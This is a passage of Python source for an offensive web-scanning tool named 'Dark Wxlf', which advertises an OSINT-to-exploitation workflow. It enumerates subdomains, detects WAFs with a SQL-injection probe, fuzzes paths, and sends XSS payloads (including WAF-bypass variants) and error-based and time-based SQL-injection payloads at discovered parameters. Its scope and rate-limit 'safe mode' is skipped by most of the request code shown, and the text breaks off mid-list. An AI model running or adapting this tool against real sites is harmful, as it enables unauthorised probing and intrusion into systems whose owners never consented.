import subprocess
import requests
import json
import os
import sys
import socket
import re
from datetime import datetime
from termcolor import colored
from pyfiglet import Figlet
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import warnings
import base64
import hashlib
from urllib.parse import urlparse, parse_qs
import asyncio
import aiohttp
warnings.filterwarnings('ignore')

class DarkWxlf:
    def __init__(self):
        self.target = None
        self.subdomains = set()
        self.live = []
        self.endpoints = []
        self.tech = {}
        self.vulns = []
        self.data = {}
        self.output = None
        self.waf_detected = None
        self.fuzzed_paths = []
        self.use_nuclei = False
        self.use_fuzzing = False
        self.output_formats = ['txt']
        
        # bug bounty safe mode
        self.bug_bounty_mode = False
        self.rate_limit_enabled = False
        self.max_requests_per_second = 10
        self.request_delay = 0.1
        self.last_request_time = 0
        self.total_requests = 0
        self.in_scope = []
        self.out_of_scope = []
        self.scope_enabled = False
        
    def show_banner(self):
        os.system('clear')
        banner = Figlet(font='slant')
        print(colored(banner.renderText('Dark Wxlf'), 'red', attrs=['bold']))
        print(colored("╔═══════════════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║     Advanced Bug Bounty Automation Framework - By GhxstSh3ll         ║", 'red'))
        print(colored("║     Passive OSINT → Active Recon → Systematic Testing → Exploitation ║", 'red'))
        print(colored("╚═══════════════════════════════════════════════════════════════════════╝", 'red'))
        print()
        
    def log(self, msg, lvl="info"):
        ts = datetime.now().strftime("%H:%M:%S")
        
        if lvl == "info":
            print(colored(f"[{ts}] [INFO] {msg}", 'cyan'))
        elif lvl == "success":
            print(colored(f"[{ts}] [✓] {msg}", 'green'))
        elif lvl == "warning":
            print(colored(f"[{ts}] [!] {msg}", 'yellow'))
        elif lvl == "error":
            print(colored(f"[{ts}] [✗] {msg}", 'red'))
        elif lvl == "phase":
            print(colored(f"\n{'='*75}", 'red'))
            print(colored(f"[PHASE] {msg}", 'red', attrs=['bold']))
            print(colored(f"{'='*75}\n", 'red'))
    
    def enforce_rate_limit(self):
        if not self.rate_limit_enabled:
            return
        
        current_time = time.time()
        time_since_last = current_time - self.last_request_time
        
        if time_since_last < self.request_delay:
            time.sleep(self.request_delay - time_since_last)
        
        self.last_request_time = time.time()
        self.total_requests += 1
    
    def check_scope(self, url):
        if not self.scope_enabled:
            return True
        
        for scope_item in self.in_scope:
            if scope_item in url:
                for out_item in self.out_of_scope:
                    if out_item in url:
                        return False
                return True
        return False
    
    def enable_bug_bounty_mode(self):
        self.bug_bounty_mode = True
        self.rate_limit_enabled = True
        self.scope_enabled = True
        print(colored("[*] Bug Bounty Safe Mode ENABLED", 'green', attrs=['bold']))
        print(colored(f"    Rate limit: {self.max_requests_per_second} requests/second", 'green'))
        print(colored("    Scope filtering: ACTIVE", 'green'))
        print()
    
    def safe_request(self, method='get', url='', **kwargs):
        if self.scope_enabled and not self.check_scope(url):
            return None
        
        self.enforce_rate_limit()
        
        try:
            if method.lower() == 'get':
                return requests.get(url, **kwargs)
            elif method.lower() == 'post':
                return requests.post(url, **kwargs)
            elif method.lower() == 'put':
                return requests.put(url, **kwargs)
            elif method.lower() == 'delete':
                return requests.delete(url, **kwargs)
        except Exception as e:
            return None
    
    def toggle_rate_limit(self, enabled=None):
        if enabled is None:
            self.rate_limit_enabled = not self.rate_limit_enabled
        else:
            self.rate_limit_enabled = enabled
        
        status = "ENABLED" if self.rate_limit_enabled else "DISABLED"
        print(colored(f"[*] Rate limiting {status}", 'yellow'))
        if self.rate_limit_enabled:
            print(colored(f"    Max: {self.max_requests_per_second} requests/second", 'yellow'))
    
    def set_rate_limit(self, max_rps):
        if max_rps <= 0:
            print(colored("[!] Rate limit must be positive", 'red'))
            return
        
        self.max_requests_per_second = max_rps
        self.request_delay = 1.0 / max_rps
        print(colored(f"[*] Rate limit set to {max_rps} requests/second", 'green'))
    
    def save_output(self, section, content):
        if not self.output:
            return
            
        with open(self.output, 'a') as f:
            f.write(f"\n{'='*80}\n{section}\n{'='*80}\n{content}\n")
    
    def passive_recon(self, domain):
        self.log("PHASE 1: PASSIVE OSINT (NO DIRECT TARGET CONTACT)", "phase")
        
        # Strip http/https and trailing slashes
        domain = domain.replace('http://', '').replace('https://', '').rstrip('/')
        
        self.target = domain
        self.output = f"dark_wxlf_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        self.log("Starting passive info gathering - this won't touch the target", "info")
        self.log("Passive recon is completely undetectable", "info")
        
        self.enum_subs()
        
        self.log(f"Phase 1 done: Found {len(self.subdomains)} subdomains", "success")
        
        summary = f"""
Target: {self.target}
Subdomains Found: {len(self.subdomains)}

All Subdomains:
{chr(10).join(sorted(self.subdomains))}
"""
        self.save_output("PHASE 1: PASSIVE OSINT RESULTS", summary)
    
    def enum_subs(self):
        self.log("Running subdomain enumeration from 4 sources", "info")
        self.log("Tools: Subfinder, Amass, crt.sh, HackerTarget", "info")
        
        def subfinder():
            try:
                self.log("Starting subfinder...", "info")
                r = subprocess.run(
                    f"subfinder -d {self.target} -silent",
                    shell=True, capture_output=True, text=True, timeout=180
                )
                if r.stdout:
                    results = set([s.strip() for s in r.stdout.strip().split('\n') if s.strip()])
                    self.log(f"Subfinder got {len(results)} results", "success")
                    return results
            except Exception as e:
                self.log(f"Subfinder error: {str(e)[:50]}", "error")
            return set()
        
        def amass_scan():
            # check if amass is installed first
            try:
                check = subprocess.run(
                    'amass -version',
                    shell=True,
                    capture_output=True,
                    timeout=3,
                    text=True
                )
                if check.returncode != 0:
                    return set()
            except:
                return set()
            
            try:
                self.log("Starting amass passive mode...", "info")
                r = subprocess.run(
                    f"amass enum -d {self.target} -passive",
                    shell=True, capture_output=True, text=True, timeout=180
                )
                if r.stdout:
                    results = set([s.strip() for s in r.stdout.strip().split('\n') if s.strip()])
                    self.log(f"Amass got {len(results)} results", "success")
                    return results
            except:
                # silently skip if amass fails - no error needed
                pass
            return set()
        
        def crtsh():
            try:
                self.log("Checking Certificate Transparency logs...", "info")
                resp = requests.get(
                    f"https://crt.sh/?q=%.{self.target}&output=json",
                    timeout=30
                )
                if resp.status_code == 200:
                    data = resp.json()
                    results = set()
                    for cert in data:
                        name = cert.get('name_value', '')
                        for sub in name.split('\n'):
                            sub = sub.strip().replace('*.', '')
                            if sub and self.target in sub:
                                results.add(sub)
                    self.log(f"crt.sh got {len(results)} results", "success")
                    return results
            except Exception as e:
                self.log(f"crt.sh error: {str(e)[:50]}", "error")
            return set()
        
        def hackertarget():
            try:
                self.log("Querying HackerTarget...", "info")
                resp = requests.get(
                    f"https://api.hackertarget.com/hostsearch/?q={self.target}",
                    timeout=15
                )
                if resp.status_code == 200:
                    results = set()
                    for line in resp.text.split('\n'):
                        if ',' in line:
                            sub = line.split(',')[0].strip()
                            if sub and self.target in sub:
                                results.add(sub)
                    self.log(f"HackerTarget got {len(results)} results", "success")
                    return results
            except Exception as e:
                self.log(f"HackerTarget error: {str(e)[:50]}", "error")
            return set()
        
        # run everything at once
        with ThreadPoolExecutor(max_workers=4) as ex:
            jobs = {
                ex.submit(subfinder): 'Subfinder',
                ex.submit(amass_scan): 'Amass',
                ex.submit(crtsh): 'crt.sh',
                ex.submit(hackertarget): 'HackerTarget'
            }
            
            for job in as_completed(jobs):
                res = job.result()
                self.subdomains.update(res)
        
        self.log(f"Total unique: {len(self.subdomains)} subdomains", "success")
    
    def active_recon(self):
        self.log("PHASE 2: ACTIVE RECONNAISSANCE (TOUCHING TARGET)", "phase")
        self.log("Warning: This will show up in target's logs", "warning")
        
        confirm = input(colored("\n[?] Continue with active recon? (yes/no): ", 'yellow'))
        if confirm.lower() != 'yes':
            self.log("Skipping active recon", "warning")
            return
        
        self.log("Starting active scanning...", "info")
        self.check_live()
        self.find_webapps()
        
        self.log("Phase 2 complete", "success")
        
        summary = f"""
Live Hosts: {len(self.live)}
Web Apps: {len(self.data.get('web_apps', []))}

Live Hosts:
{chr(10).join([f"{h['sub']} -> {h['ip']}" for h in self.live])}
"""
        self.save_output("PHASE 2: ACTIVE RECON RESULTS", summary)
    
    def check_live(self):
        self.log("Checking which hosts are actually live...", "info")
        
        # set dns timeout so we don't wait forever
        socket.setdefaulttimeout(3)
        
        cnt = 0
        total = len(self.subdomains)
        checked = 0
        
        with ThreadPoolExecutor(max_workers=50) as ex:
            def check(sub):
                try:
                    ip = socket.gethostbyname(sub)
                    return {'sub': sub, 'ip': ip}
                except:
                    return None
            
            jobs = [ex.submit(check, s) for s in self.subdomains]
            
            for job in as_completed(jobs):
                res = job.result()
                checked += 1
                
                # show progress so user knows we're not stuck
                print(f"\r[*] Checking hosts: {checked}/{total} ({len(self.live)} live)", end='', flush=True)
                
                if res:
                    self.live.append(res)
                    cnt += 1
        
        print()  # newline after progress bar
        self.log(f"Found {len(self.live)} live hosts", "success")
    
    def find_webapps(self):
        self.log("Looking for web applications...", "info")
        
        apps = []
        total = len(self.live)
        done = 0
        
        with ThreadPoolExecutor(max_workers=30) as ex:
            def probe(host):
                sub = host['sub']
                results = []
                
                # try both http and https
                for scheme in ['https', 'http']:
                    try:
                        url = f"{scheme}://{sub}"
                        # reduced timeout from 5s to 3s - faster and still catches everything
                        r = requests.get(url, timeout=3, allow_redirects=True, verify=False)
                        
                        if r.status_code < 500:
                            results.append({
                                'url': url,
                                'status': r.status_code,
                                'title': self.get_title(r.text),
                                'server': r.headers.get('Server', 'Unknown'),
                                'headers': dict(r.headers)
                            })
                    except:
                        pass
                
                return results
            
            jobs = [ex.submit(probe, h) for h in self.live]
            
            for job in as_completed(jobs):
                res = job.result()
                done += 1
                
                # show progress - let user know it's working
                print(f"\r[*] Probing web apps: {done}/{total} ({len(apps)} found)", end='', flush=True)
                
                if res:
                    apps.extend(res)
        
        print()  # newline
        self.data['web_apps'] = apps
        self.log(f"Found {len(apps)} web applications", "success")
    
    def get_title(self, html):
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        if match:
            return match.group(1).strip()[:100]
        return "No title"
    
    def analyze(self):
        self.log("PHASE 3: ANALYZING TARGET", "phase")
        
        self.log("Running tech detection...", "info")
        
        total_apps = len(self.data.get('web_apps', []))
        analyzed = 0
        
        # use threadpool for parallel analysis - way faster
        with ThreadPoolExecutor(max_workers=20) as ex:
            def analyze_app(app):
                url = app['url']
                
                try:
                    # reduced timeout from 10s to 5s - still catches everything
                    r = requests.get(url, timeout=5, verify=False)
                    
                    # check headers for tech
                    headers = r.headers
                    server = headers.get('Server', '').lower()
                    xpowered = headers.get('X-Powered-By', '').lower()
                    
                    techs = []
                    
                    if 'nginx' in server:
                        techs.append('Nginx')
                    if 'apache' in server:
                        techs.append('Apache')
                    if 'cloudflare' in server:
                        techs.append('Cloudflare')
                    if 'php' in xpowered:
                        techs.append('PHP')
                    if 'asp.net' in xpowered:
                        techs.append('ASP.NET')
                    
                    # check body for frameworks
                    body = r.text.lower()
                    
                    if 'wordpress' in body or 'wp-content' in body:
                        techs.append('WordPress')
                    if 'joomla' in body:
                        techs.append('Joomla')
                    if 'drupal' in body:
                        techs.append('Drupal')
                    if 'react' in body or 'reactjs' in body:
                        techs.append('React')
                    if 'angular' in body or 'ng-app' in body:
                        techs.append('Angular')
                    if 'vue' in body or 'vuejs' in body:
                        techs.append('Vue.js')
                    
                    return (url, techs)
                    
                except:
                    return (url, [])
            
            jobs = [ex.submit(analyze_app, app) for app in self.data.get('web_apps', [])]
            
            for job in as_completed(jobs):
                url, techs = job.result()
                analyzed += 1
                
                # show progress
                print(f"\r[*] Analyzing apps: {analyzed}/{total_apps}", end='', flush=True)
                
                if techs:
                    self.tech[url] = techs
        
        print()  # newline after progress
        self.log("Tech detection complete", "success")
        
        # crawl for endpoints
        self.log("Crawling for endpoints...", "info")
        
        crawled = 0
        total_crawl = len(self.data.get('web_apps', []))
        found_endpoints = []
        
        # parallel crawling for speed
        with ThreadPoolExecutor(max_workers=20) as ex:
            def crawl_app(app):
                url = app['url']
                endpoints = []
                
                try:
                    r = requests.get(url, timeout=5, verify=False)
                    
                    # find links
                    links = re.findall(r'href=["\'](.*?)["\']', r.text)
                    
                    for link in links:
                        if link.startswith('http'):
                            endpoints.append(link)
                        elif link.startswith('/'):
                            endpoints.append(f"{url}{link}")
                    
                except:
                    pass
                
                return endpoints
            
            jobs = [ex.submit(crawl_app, app) for app in self.data.get('web_apps', [])]
            
            for job in as_completed(jobs):
                endpoints = job.result()
                crawled += 1
                
                if endpoints:
                    found_endpoints.extend(endpoints)
                
                # show crawling progress
                print(f"\r[*] Crawling: {crawled}/{total_crawl} ({len(found_endpoints)} endpoints)", end='', flush=True)
        
        print()  # newline
        self.endpoints = list(set(found_endpoints))[:100]  # limit to first 100
        
        self.log(f"Found {len(self.endpoints)} endpoints", "success")
    
    def detect_waf(self):
        """Check if there's a WAF protecting the target"""
        self.log("Checking for WAF/CDN protection...", "info")
        
        waf_signatures = {
            'Cloudflare': ['__cfduid', 'cf-ray', 'cloudflare'],
            'AWS WAF': ['x-amzn-requestid', 'x-amz-cf-id'],
            'Akamai': ['akamai', 'x-akamai'],
            'Imperva': ['incap_ses', 'visid_incap'],
            'Sucuri': ['x-sucuri-id', 'sucuri'],
            'ModSecurity': ['mod_security', 'NOYB'],
            'F5 BIG-IP': ['BigIP', 'F5', 'TS01'],
            'Barracuda': ['barra_counter_session'],
            'Fortinet': ['fortigate', 'fortiwasd_cookie']
        }
        
        detected = []
        
        for app in self.data.get('web_apps', [])[:5]:  # check first 5 apps
            url = app['url']
            
            try:
                # send suspicious request to trigger WAF
                r = requests.get(
                    url + "?id=1'OR'1'='1",
                    headers={'User-Agent': 'sqlmap/1.0'},
                    timeout=3,
                    verify=False
                )
                
                # check headers and body for WAF signatures
                headers_str = ' '.join([f"{k}:{v}" for k,v in r.headers.items()]).lower()
                body = r.text.lower()
                combined = headers_str + ' ' + body
                
                for waf, sigs in waf_signatures.items():
                    if any(sig.lower() in combined for sig in sigs):
                        if waf not in detected:
                            detected.append(waf)
                            self.log(f"WAF detected: {waf}", "warning")
                
                # check for generic WAF behavior
                if r.status_code in [403, 406, 419, 429, 503]:
                    if 'blocked' in body or 'forbidden' in body or 'access denied' in body:
                        if 'Generic WAF' not in detected:
                            detected.append('Generic WAF')
                            self.log("Generic WAF behavior detected", "warning")
                            
            except:
                pass
        
        if detected:
            self.waf_detected = detected
            self.log(f"WAF/Protection: {', '.join(detected)}", "warning")
            self.log("Note: Some tests might be blocked by WAF", "warning")
        else:
            self.log("No WAF detected - full testing possible", "success")
            self.waf_detected = None
    
    def run_fuzzing(self):
        """Fuzz for hidden directories and files using ffuf"""
        self.log("Starting directory/file fuzzing with ffuf...", "info")
        
        # check if ffuf is installed - try multiple ways
        ffuf_found = False
        
        # method 1: try running it directly with shell
        try:
            result = subprocess.run(
                'ffuf -h',
                shell=True,
                capture_output=True,
                timeout=3,
                text=True
            )
            if result.returncode == 0 or 'ffuf' in result.stdout.lower():
                ffuf_found = True
        except:
            pass
        
        # method 2: check common install locations
        if not ffuf_found:
            common_paths = [
                os.path.expanduser('~/go/bin/ffuf'),
                '/usr/local/bin/ffuf',
                '/usr/bin/ffuf',
                os.path.expanduser('~/.local/bin/ffuf')
            ]
            
            for path in common_paths:
                if os.path.exists(path):
                    ffuf_found = True
                    break
        
        if not ffuf_found:
            self.log("ffuf not installed - skipping fuzzing", "error")
            self.log("Install: go install github.com/ffuf/ffuf@latest", "info")
            self.log("Then run: export PATH=$PATH:~/go/bin", "info")
            return
        
        wordlist_paths = [
            '/usr/share/wordlists/dirb/common.txt',
            '/usr/share/seclists/Discovery/Web-Content/common.txt',
            '/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt'
        ]
        
        wordlist = None
        for path in wordlist_paths:
            if os.path.exists(path):
                wordlist = path
                break
        
        if not wordlist:
            self.log("No wordlist found - skipping fuzzing", "warning")
            return
        
        self.log(f"Using wordlist: {wordlist}", "info")
        
        # fuzz first few web apps
        for app in self.data.get('web_apps', [])[:3]:  # limit to 3 to save time
            url = app['url']
            
            self.log(f"Fuzzing: {url}", "info")
            
            try:
                # run ffuf
                cmd = f'ffuf -u {url}/FUZZ -w {wordlist} -mc 200,204,301,302,307,401,403 -fs 0 -t 50 -timeout 3 -silent'
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                
                if result.stdout:
                    # parse ffuf output
                    for line in result.stdout.split('\n'):
                        if url in line:
                            # extract the found path
                            match = re.search(r'(https?://[^\s]+)', line)
                            if match:
                                found_url = match.group(1)
                                self.fuzzed_paths.append(found_url)
                                self.endpoints.append(found_url)
                
                self.log(f"Found {len([p for p in self.fuzzed_paths if url in p])} new paths", "success")
                
            except subprocess.TimeoutExpired:
                self.log(f"Fuzzing timeout for {url}", "warning")
            except Exception as e:
                self.log(f"Fuzzing error: {str(e)[:50]}", "error")
        
        if self.fuzzed_paths:
            self.log(f"Total fuzzed paths discovered: {len(self.fuzzed_paths)}", "success")
    
    def run_nuclei(self):
        """Run nuclei vulnerability scanner"""
        self.log("Starting Nuclei vulnerability scan...", "info")
        
        # check if nuclei is installed - try multiple ways
        nuclei_found = False
        
        # method 1: try running it directly with shell
        try:
            result = subprocess.run(
                'nuclei -version',
                shell=True,
                capture_output=True,
                timeout=3,
                text=True
            )
            if result.returncode == 0 or 'nuclei' in result.stdout.lower():
                nuclei_found = True
        except:
            pass
        
        # method 2: check common install locations
        if not nuclei_found:
            common_paths = [
                os.path.expanduser('~/go/bin/nuclei'),
                '/usr/local/bin/nuclei',
                '/usr/bin/nuclei',
                os.path.expanduser('~/.local/bin/nuclei')
            ]
            
            for path in common_paths:
                if os.path.exists(path):
                    nuclei_found = True
                    break
        
        if not nuclei_found:
            self.log("Nuclei not installed - skipping", "error")
            self.log("Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest", "info")
            self.log("Then run: export PATH=$PATH:~/go/bin", "info")
            return []
        
        findings = []
        
        # create temp file with URLs
        url_file = '/tmp/dark_wxlf_urls.txt'
        with open(url_file, 'w') as f:
            for app in self.data.get('web_apps', []):
                f.write(app['url'] + '\n')
        
        self.log(f"Running Nuclei on {len(self.data.get('web_apps', []))} targets...", "info")
        self.log("This might take a few minutes...", "info")
        
        try:
            # run nuclei with common templates - use shell=True to respect PATH
            cmd = f'nuclei -l {url_file} -silent -json -severity critical,high,medium -timeout 10 -retries 1'
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300  # 5 min timeout
            )
            
            if result.stdout:
                # parse JSON output
                for line in result.stdout.strip().split('\n'):
                    try:
                        data = json.loads(line)
                        
                        vuln = {
                            'type': f"Nuclei: {data.get('info', {}).get('name', 'Unknown')}",
                            'severity': data.get('info', {}).get('severity', 'UNKNOWN').upper(),
                            'url': data.get('host', ''),
                            'param': data.get('matched-at', ''),
                            'payload': data.get('template-id', ''),
                            'evidence': data.get('matcher-name', 'Nuclei detection'),
                            'impact': data.get('info', {}).get('description', 'See Nuclei template'),
                            'fix': data.get('info', {}).get('remediation', 'Check vendor documentation'),
                            'poc': self.nuclei_poc(data),
                            'cvss': 'N/A'
                        }
                        findings.append(vuln)
                        self.log(f"Nuclei found: {vuln['type']}", "success")
                        
                    except json.JSONDecodeError:
                        pass
            
            self.log(f"Nuclei scan complete: {len(findings)} findings", "success")
            
        except subprocess.TimeoutExpired:
            self.log("Nuclei scan timeout - results may be incomplete", "warning")
        except Exception as e:
            self.log(f"Nuclei error: {str(e)[:50]}", "error")
        finally:
            # cleanup
            if os.path.exists(url_file):
                os.remove(url_file)
        
        return findings
    
    def advanced_recon_menu(self):
        """Ask user what advanced recon they want"""
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                  ADVANCED RECON OPTIONS                        ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        print(colored("Available Options:", 'cyan', attrs=['bold']))
        print(colored("  [1] WAF Detection", 'white') + colored(" - Identify protection mechanisms", 'yellow'))
        print(colored("  [2] Directory Fuzzing (ffuf)", 'white') + colored(" - Find hidden paths/files", 'yellow'))
        print(colored("  [3] Nuclei Scanner", 'white') + colored(" - 1000s of vuln templates", 'yellow'))
        print()
        print(colored("Quick Options:", 'yellow'))
        print(colored("  [all]  Run all advanced recon", 'green'))
        print(colored("  [skip] Skip advanced recon", 'red'))
        print()
        
        choice = input(colored("[?] Select options (comma-separated) or quick option: ", 'yellow')).strip().lower()
        
        if choice == 'skip':
            self.log("Skipping advanced recon", "info")
            return
        
        run_waf = False
        run_fuzz = False
        run_nuclei = False
        
        if choice == 'all':
            run_waf = True
            run_fuzz = True
            run_nuclei = True
        else:
            opts = [o.strip() for o in choice.split(',')]
            if '1' in opts:
                run_waf = True
            if '2' in opts:
                run_fuzz = True
            if '3' in opts:
                run_nuclei = True
        
        # run selected options
        if run_waf:
            self.detect_waf()
        
        if run_fuzz:
            self.run_fuzzing()
        
        if run_nuclei:
            self.use_nuclei = True
    
    def output_format_menu(self):
        """Ask what output formats they want"""
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                    OUTPUT FORMAT OPTIONS                       ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        print(colored("Available Formats:", 'cyan', attrs=['bold']))
        print(colored("  [1] TXT Report", 'white') + colored(" - Human-readable text", 'yellow'))
        print(colored("  [2] JSON Output", 'white') + colored(" - Machine-readable for tools", 'yellow'))
        print(colored("  [3] HTML Report", 'white') + colored(" - Web-based visual report", 'yellow'))
        print()
        print(colored("Quick Options:", 'yellow'))
        print(colored("  [all]  Generate all formats", 'green'))
        print()
        
        choice = input(colored("[?] Select formats (comma-separated) or 'all': ", 'yellow')).strip().lower()
        
        self.output_formats = []
        
        if choice == 'all':
            self.output_formats = ['txt', 'json', 'html']
        else:
            opts = [o.strip() for o in choice.split(',')]
            if '1' in opts or not opts:
                self.output_formats.append('txt')
            if '2' in opts:
                self.output_formats.append('json')
            if '3' in opts:
                self.output_formats.append('html')
        
        if not self.output_formats:
            self.output_formats = ['txt']  # default
        
        self.log(f"Will generate: {', '.join([f.upper() for f in self.output_formats])}", "success")
    
    def select_tests(self):
        """Let user pick which vulnerability tests to run"""
        
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║              SELECT VULNERABILITY TESTS TO RUN                 ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        # all available tests with descriptions
        tests = {
            '1': {'name': 'XSS (Cross-Site Scripting)', 'func': self.test_xss, 'severity': 'HIGH'},
            '2': {'name': 'SQL Injection', 'func': self.test_sqli, 'severity': 'CRITICAL'},
            '3': {'name': 'IDOR (Broken Access)', 'func': self.test_idor, 'severity': 'HIGH'},
            '4': {'name': 'SSRF (Server-Side Request Forgery)', 'func': self.test_ssrf, 'severity': 'CRITICAL'},
            '5': {'name': 'Open Redirect', 'func': self.test_open_redirect, 'severity': 'MEDIUM'},
            '6': {'name': 'XXE (XML External Entity)', 'func': self.test_xxe, 'severity': 'CRITICAL'},
            '7': {'name': 'Command Injection', 'func': self.test_cmd_injection, 'severity': 'CRITICAL'},
            '8': {'name': 'Path Traversal / LFI', 'func': self.test_path_traversal, 'severity': 'HIGH'},
            '9': {'name': 'Sensitive File Exposure', 'func': self.test_sensitive_files, 'severity': 'HIGH'},
            '10': {'name': 'CORS Misconfiguration', 'func': self.test_cors, 'severity': 'MEDIUM'},
            '11': {'name': 'Missing Security Headers', 'func': self.test_security_headers, 'severity': 'LOW'},
            '12': {'name': 'Rate Limiting Issues', 'func': self.test_rate_limiting, 'severity': 'MEDIUM'},
            '13': {'name': 'CRLF Injection', 'func': self.test_crlf, 'severity': 'MEDIUM'},
            '14': {'name': 'GraphQL Introspection', 'func': self.test_graphql, 'severity': 'MEDIUM'},
            '15': {'name': 'JWT Vulnerabilities', 'func': self.test_jwt, 'severity': 'HIGH'},
            '16': {'name': 'Subdomain Takeover', 'func': self.test_subdomain_takeover, 'severity': 'HIGH'},
            '17': {'name': 'SSTI (Template Injection)', 'func': self.test_ssti, 'severity': 'CRITICAL'},
            '18': {'name': 'Host Header Injection', 'func': self.test_host_header, 'severity': 'MEDIUM'},
            '19': {'name': 'WebSocket Security', 'func': self.test_websocket, 'severity': 'MEDIUM'}
        }
        
        # display the menu
        print(colored("Available Tests:", 'cyan', attrs=['bold']))
        print()
        
        for num, info in sorted(tests.items(), key=lambda x: int(x[0])):
            sev_color = {
                'CRITICAL': 'red',
                'HIGH': 'yellow', 
                'MEDIUM': 'cyan',
                'LOW': 'white'
            }.get(info['severity'], 'white')
            
            print(colored(f"  [{num:>2}] {info['name']:<40}", 'white') + 
                  colored(f" [{info['severity']}]", sev_color, attrs=['bold']))
        
        print()
        print(colored("Quick Options:", 'yellow'))
        print(colored("  [all]      Run ALL tests (recommended)", 'green'))
        print(colored("  [critical] Run only CRITICAL severity tests", 'red'))
        print(colored("  [quick]    Run fast tests only (XSS, SQLi, IDOR, Files)", 'cyan'))
        print()
        
        choice = input(colored("[?] Enter test numbers (comma-separated), or option: ", 'yellow')).strip().lower()
        
        selected = []
        
        if choice == 'all':
            selected = list(tests.values())
            self.log("Running ALL vulnerability tests", "success")
        
        elif choice == 'critical':
            selected = [t for t in tests.values() if t['severity'] == 'CRITICAL']
            self.log(f"Running {len(selected)} CRITICAL tests", "success")
        
        elif choice == 'quick':
            # fast tests that don't take long
            quick_nums = ['1', '2', '3', '9']
            selected = [tests[n] for n in quick_nums]
            self.log("Running quick scan (4 tests)", "success")
        
        else:
            # parse comma-separated numbers
            nums = [n.strip() for n in choice.split(',')]
            for n in nums:
                if n in tests:
                    selected.append(tests[n])
                else:
                    self.log(f"Invalid test number: {n}", "warning")
            
            if not selected:
                self.log("No valid tests selected, running ALL by default", "warning")
                selected = list(tests.values())
        
        return selected
    
    def test_vulns(self):
        self.log("PHASE 4: VULNERABILITY TESTING", "phase")
        
        # let user select which tests to run
        selected_tests = self.select_tests()
        
        if not selected_tests:
            self.log("No tests selected, exiting", "error")
            return
        
        print()
        self.log(f"Starting {len(selected_tests)} vulnerability tests...", "info")
        print()
        
        findings = []
        test_num = 0
        total_tests = len(selected_tests)
        
        # run each selected test
        for test in selected_tests:
            test_num += 1
            print(f"\n[*] Running test {test_num}/{total_tests}: {test['name']}")
            
            try:
                results = test['func']()
                findings.extend(results)
            except Exception as e:
                self.log(f"Error in {test['name']}: {str(e)[:50]}", "error")
        
        # run nuclei if enabled
        if self.use_nuclei:
            print()
            nuclei_findings = self.run_nuclei()
            findings.extend(nuclei_findings)
        
        self.vulns = findings
        
        print()
        self.log(f"Testing complete: {len(findings)} vulnerabilities found", "success")
        
        self.make_report(findings)
    
    def test_xss(self):
        self.log("Testing for XSS vulnerabilities...", "info")
        
        found = []
        
        # way more payloads - various contexts and bypasses
        basic_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '<svg onload=alert(1)>'
        ]
        
        # waf bypass variants - encodings and stuff
        bypass_payloads = [
            '<svg/onload=alert(1)>',
            '<img src=x onerror="alert`1`">',
            '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">',
            '"><svg/onload=alert(1)>',
            '<img src=x onerror=alert(/xss/)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '"><img src=x onerror=prompt(1)>',
        ]
        
        # combine them
        all_payloads = basic_payloads + bypass_payloads
        
        for ep in self.endpoints[:30]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                for payload in all_payloads:
                    try:
                        base = ep.split('?')[0]
                        test_url = f"{base}?{param}={payload}"
                        
                        r = requests.get(test_url, timeout=3, verify=False)
                        
                        # check if reflected
                        if payload in r.text:
                            # try to figure out context for better detection
                            context = "unknown"
                            response_lower = r.text.lower()
                            
                            # is it in a script tag?
                            if '<script' in response_lower and payload.lower() in response_lower:
                                context = "script context"
                            # in an attribute?
                            elif 'value="' in response_lower or 'href="' in response_lower:
                                context = "attribute context"
                            # html body?
                            elif '<body' in response_lower:
                                context = "html body"
                            
                            vuln = {
                                'type': 'XSS (Reflected)',
                                'severity': 'HIGH',
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'evidence': f'Payload reflected in response ({context})',
                                'impact': 'Account takeover, session hijacking, credential theft',
                                'fix': 'Encode user input, implement CSP headers',
                                'poc': self.xss_poc(test_url, param, payload),
                                'cvss': '7.1 HIGH'
                            }
                            found.append(vuln)
                            self.log(f"XSS found: {base}", "success")
                            break  # don't spam same endpoint
                    except:
                        pass
        
        self.log(f"XSS tests done: {len(found)} findings", "success")
        return found
    
    def test_sqli(self):
        self.log("Testing for SQL injection...", "info")
        
        found = []
        
        # error-based payloads
        error_payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "1' AND 1=1--",
            "' UNION SELECT NULL--",
            "' AND 1=2 UNION SELECT NULL--",
            "admin'--",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "1' ORDER BY 10--"
        ]
        
        # time-based blind payloads - different db types
        time_payloads = {
            'mysql': "' AND SLEEP(5)--",
            'postgres': "'; SELECT pg_sleep(5)--",
            'mssql': "'; WAITFOR DELAY '0:0:5'--",
            'oracle': "' AND DBMS_LOCK.SLEEP(5)--",
            'generic': "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        }
        
        sql_errors = [
            'sql syntax',
            'mysql',
            'postgresql',
            'sqlite',
            'ora-',
            'syntax error',
